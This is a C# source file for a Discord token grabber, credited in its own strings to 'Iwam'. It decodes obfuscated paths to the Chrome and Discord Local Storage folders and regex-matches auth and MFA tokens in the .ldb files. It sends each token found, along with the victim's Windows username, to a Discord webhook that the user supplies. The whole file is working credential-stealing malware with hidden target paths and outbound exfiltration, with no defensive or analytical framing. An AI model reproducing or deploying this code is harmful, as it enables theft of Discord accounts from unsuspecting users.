using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Net;
using System.Collections.Specialized;

namespace Custom
{
    internal static class Program
    {
        static void Main(string[] args)
        {            
            var user = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            //google
            if (Directory.Exists(user + @"\" + @"?nnB_r_ZJma_jZEmmejcZafpmkcZSqcpB_r_ZBcd_sjrZJma_jQrmp_ecZjctcjb`".DecryptCipher()))
            {
                SEARCH(user + @"\" + @"?nnB_r_ZJma_jZEmmejcZafpmkcZSqcpB_r_ZBcd_sjrZJma_jQrmp_ecZjctcjb`".DecryptCipher());
            }

            //discord
            if (Directory.Exists(user + @"\" + @"?nnB_r_ZPm_kgleZbgqampbZjma_jQrmp_ecZjctcjb`".DecryptCipher()))
            {
                SEARCH(user + @"\" + @"?nnB_r_ZPm_kgleZbgqampbZjma_jQrmp_ecZjctcjb`".DecryptCipher());
            }
            
            //canary
            if (Directory.Exists(user + @"\" + @"?nnB_r_ZPm_kgleZbgqampba_l_pwZJma_jQrmp_ecZjctcjb`".DecryptCipher()))
            {
                SEARCH(user + @"\" + @"?nnB_r_ZPm_kgleZbgqampba_l_pwZJma_jQrmp_ecZjctcjb`".DecryptCipher());
            }           

            //ptb
            if (Directory.Exists(user + @"\" + @"?nnB_r_ZPm_kgleZbgqampbnr`ZJma_jQrmp_ecZjctcjb`".DecryptCipher()))
            {
                SEARCH(user + @"\" + @"?nnB_r_ZPm_kgleZbgqampbnr`ZJma_jQrmp_ecZjctcjb`".DecryptCipher());
            }
                        
            Console.ReadLine();
        }
        
        static void SEARCH(string path)
        {
                                                    
            var filesInPath = Directory.GetFiles(path);                                                    
            
            string[] target = new string[filesInPath.Length];

            for (int i = 0; i < filesInPath.Length; i++)
            {
                if (filesInPath[i].EndsWith("ldb"))
                {
                    var match = Regex.Match(File.ReadAllText(filesInPath[i]), @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
                    var match2 = Regex.Match(File.ReadAllText(filesInPath[i]), @"mfa\.[\w-]{84}");
                    
                    if(match.Value != String.Empty)
                    {
                        target[i] = match.Value;                        
                        Send(target[i]);
                    }
                    if(match2.Value != String.Empty)
                    {
                        target[i] = match2.Value;                                                
                        Send(target[i]);
                    }
                }
            }
        }
        static string DecryptCipher(this string target)
        {
            var decrypted = string.Empty;

            foreach (char cha in target)
            {
                string str = cha.ToString();
                var ascii = char.ConvertToUtf32(str, 0);
                var modifiedAscii = ascii + 2;
                decrypted = decrypted + char.ConvertFromUtf32(modifiedAscii);
            }
            return decrypted;
        }

        private static void Send(string message)
        {
            Post(/*your webhook*/, new NameValueCollection
            {
                {"username", "Token Grabber by Iwam"},
                {
                    "avatar_url",
                    "https://cdn.discordapp.com/attachments/696080024742395914/718483498947838063/beetlejuice-1.jpg"
                },
                {
                    "content",
                    "```\n" + "Report from Iwam\n\n" + "Username: " + Environment.UserName +
                    "\nTokens:\n\n" + string.Join("\n", message) + "\n\nLast one is correct" + "\n```"
                }
            });
        }

        private static void Post(string uri, NameValueCollection pairs)
        {
            using (WebClient webClient = new WebClient())
            {
                webClient.UploadValues(uri, pairs);
            }
        }       

        
    }
}
